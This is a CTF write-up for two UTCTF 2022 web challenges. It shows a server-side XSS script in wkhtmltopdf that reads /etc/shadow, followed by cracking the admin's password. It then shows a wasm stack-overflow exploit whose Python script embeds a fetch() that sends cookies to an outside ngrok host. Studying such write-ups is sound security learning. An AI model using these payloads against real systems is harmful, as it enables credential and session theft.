---
layout: post
title: "[UTCTF 2022] HTML2PDF & Sigma"
author: Vie
---

- [HTML2PDF](#html2pdf)
  - [TL;DR](#tldr)
  - [All is XSS in the web](#all-is-xss-in-the-web)
  - [Solution](#solution)
- [Sigma](#sigma)
  - [TL;DR](#tldr-1)
  - [Literally what did I just say about XSS](#literally-what-did-i-just-say-about-xss)
  - [Oh boy, I hope you like wasm](#oh-boy-i-hope-you-like-wasm)
  - [Solution](#solution-1)

# HTML2PDF

## Problem description
> My friend bet me I couldn't pwn this site. Can you help me break in?

## TL;DR
[LFI with XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

## All is XSS in the web
Before we do anything, notice the `/admin` endpoint which looks for a username and password. Would be nice to try and access that, hey? 

Back to the PDF maker: You can specify a `src` attribute in an img tag (or any tag with a `src` attribute) and the server will happily visit the URL you provided, looking for a picture. I sent it to my site just to see what specific html pdf converter was being used - [wkhtmltopdf](https://wkhtmltopdf.org/).

Search online for any vulnerabilities or potential flaws with wkhtmltopdf and you'll see 2 avenues: SSRF to access the AWS meta-data service (rabbit hole), and server-side XSS for LFI. 

I'm going to skip over the time spent on attempting to gain control of the AWS EC2 which was a red herring. The TL;DR of the vulnerabilities associated with wkhtmltopdf is its ability to execute arbitrary code, likely stemming from a legacy version of [webkit](https://blogs.gnome.org/mcatanzaro/2016/02/01/on-webkit-security-updates/). Remembering the `/admin` endpoint, it would be nice to see if there were any usernames or passwords to look out for that was in a file, and steal it through the execution of said JS code. Since we have JS execution, why not have wkhtmltopdf visit local files for us? 

## Solution

So, execute a server-side XSS which will grab the `etc/shadow` file - good to know we have some nice permissions to be able to access it. The output will be presented in the PDF.

```html
<script>
    x = new XMLHttpRequest();
    //x.open("GET","file:///etc/passwd");
    x.open("GET","file:///etc/shadow");
    x.send();
    x.onload = function(){document.write(this.responseText);}
</script>
```

![html2pdf etc/shadow](/assets/images/utctf2022/html2pdf/HTML2PDF_etcshadow.png) 

The username is now known: WeakPasswordAdmin. Now, we simply need to bruteforce the hash of WeakPasswordAdmin's password using something like John. Let the hash cracker do its thing and it should return "sunshine" as the password. Log in with those credentials and get yourself the flag:

![html2pdf flag](/assets/images/utctf2022/html2pdf/HTML2PDF_flag.png) 

# Sigma

## Challenge description

> Our new image processing tool runs completely in your browser! Right now we only support one image effect and image format though. Note: this challenge is also a reversing challenge.

## TL;DR
Overflow in wasm's stack buffer between 3M and 4M RGBA bytes to spill into an eval'd JS string, overwriting it with our own XSS payload. 

## Literally what did I just say about XSS

We're given source - poke around and notice the `report.js` file which is a simple puppeteer bot that has the flag stored in their cookie. Okay, XSS, got it. 

```js
    await page.setCookie({
      "name": "flag",
      "value": process.env.FLAG,
      "url": "http://localhost:" + port
    });
```

But what does the bot even visit? 

```js
    await page.setRequestInterception(true);
    page.once('request', request => {
      var data = {
        "method": "POST",
        "postData": "image=" + encodeURIComponent(img),
        'headers': {
          ...request.headers(),
          'Content-Type': 'application/x-www-form-urlencoded'
        },
      };
```

The POST request to the admin is looking for a base64'd stream of bytes representing a png file. Let's zoom out for a bit and try to understand specifically what this application is doing. The high-level summary is as so: 

- User provides a .PNG file which, ostensibly, has to be under 10kb because of the bodyParser limit in `app.js`:

``` js
app.use(bodyParser.urlencoded({limit: '10kb', extended: true}));
```
- If user wants to invert the colors on their image, a JS file called `index.js` passes to a wasm file called `a.out.wasm` the PNG, which goes through that process (if the file is too big we get a 413 when trying to do this)
- We can make a request to report a given image to the admin - it's sent as a POST request to `/report` with the Base64'd bytes of the image file in it
- Admin looks at our picture 

So if we want to steal the cookie when the bot looks at our picture, we have to hide our request in the bytes of the image. But wait - the hidden JS probably won't be interpreted as code, so even if we do stego JS into our picture, how will we know it'll execute? 

## Reversing the Wasm

If an image is provided for inversion, `index.js` passes the raw binary data to `draw_u8a`, which allocates a block of memory inside the Wasm module using `malloc`, writes the raw PNG data there, and then calls the Wasm `draw_img` function.

Using Ghidra and the [Ghidra Wasm plugin](https://github.com/nneonneo/ghidra-wasm-plugin/), we can disassemble the `draw_img` function, which looks like this:

```c
// WARNING: Removing unreachable block (ram,0x80000608)
// WARNING: Removing unreachable block (ram,0x8000063c)

void export::draw_img(void *pngbuf,undefined4 pnglen)

{
  state *param1;
  uint uVar1;
  undefined4 in_stack_ffd23918;
  undefined4 in_stack_ffd2391c;
  uint in_stack_ffd2392c;
  
  param1 = (state *)unnamed_function_51(0);
  unnamed_function_53(param1,pngbuf,pnglen);
  unnamed_function_57(param1,&stack0xffd23918);
  unnamed_function_55(param1,1,&stack0xffd2392c);
  unnamed_function_37(param1,&stack0xffd23930,in_stack_ffd2392c,1,0);
  for (uVar1 = 0; uVar1 < in_stack_ffd2392c; uVar1 += 1) {
    if ((int)uVar1 % 4 != 3) {
      (&stack0xffd23930)[uVar1] = (&stack0xffd23930)[uVar1] ^ 0xff;
    }
  }
  draw_buf(&stack0xffd23930,in_stack_ffd23918,in_stack_ffd2391c);
  return;
}
```

There are several function calls which appear to be doing PNG decompression, followed by a loop which performs the actual inversion operation by inverting the R, G, and B components of every RGBA quartet. From the function prologue, we can see that 3000048 bytes are allocated on the C stack, which is enough for 1000000 RGB triples - but this code now supports alpha (as the site proudly proclaims). Therefore, we have a buffer overflow: the buffer used to be big enough for RGB images up to 1000x1000, but a 1000x1000 RGBA image contains 4000000 bytes, enough to overflow this stack buffer.

After performing the inversion, `draw_img` calls `draw_buf`, which formas the string `draw_buf(%u, %u, %u);` and passes it to `emscripten_run_script`. `emscripten_run_script` in `a.out.js` lets us run arbitrary JS as follows:

```js
  function _emscripten_run_script(ptr) {
      eval(UTF8ToString(ptr));
    }
```

`global_0` holds the stack pointer, which is initialized to 0x500000. The static string `draw_buf(%u, %u, %u)` is located at 0x500056. Therefore, if we overflow the stack, we can overwrite the format string, which will allow us to control the string that's passed into `_emscripten_run_script` and give us arbitrary script execution. Sounds like just what we need then!

We built an image of size 894x839, which contains 3000264 bytes of image data - just enough to overflow the buffer and the format string, without overflowing too much data in the binary and risking corruption. Using `pwn.cyclic`, we overflowed the stack using a de Bruijn sequence, and verified using the WebAssembly debugger in Firefox that the format string was being overwritten - but `_emscripten_run_script` wasn't getting called at all!

Single-step debugging revealed that `draw_img` was bailing out in an extra code block between the `for` loop and the `draw_buf` - which Ghidra had happily deleted as "unreachable"! It turns out that this code checks two 32-bit values on the stack as a simple kind of "stack canary"; since the values would not normally change, Ghidra decided that the checks were redundant. By checking the loaded canary values with `pwn.cyclic_find`, we were able to figure out the correct offsets in our image data, set the proper canaries, and watch `eval` get called!

## Solution

The attack flow is now clear: we just need need to create an image which, when decoded, is a little over 3M bytes and overflow the allocated buffer, with the proper stack canaries in place. The remaining bytes that spill into the string `draw_buf` will be a string that represents JS code. Therefore, when the logic passes it to `_emscripten_run_script()`, it doesn't eval `draw_buf()`, it evals our XSS payload instead. 

Here's our exploit script:

```python
import numpy as np
from PIL import Image
import pwn
import struct

payload = "fetch('https://redacted.ngrok.io/?c='+(document.cookie));"

payload = payload.encode() + b"\0"
arr = np.zeros((839, 894, 4), dtype='uint8')
row = bytearray(pwn.cyclic(894 * 4 - 1) + b'\0')
row[3312:3316] = struct.pack("<I", 0x42042042)
row[3316:3320] = struct.pack("<I", 0xdeadbeef)
row[3414:3414 + len(payload)] = payload
row = np.asarray(list(row))
arr[:, :, 3] = 0xff
arr[-1] = row.reshape((-1, 4))
arr[:, :, :3] ^= 0xff
Image.fromarray(arr).save("exploit.png")
```
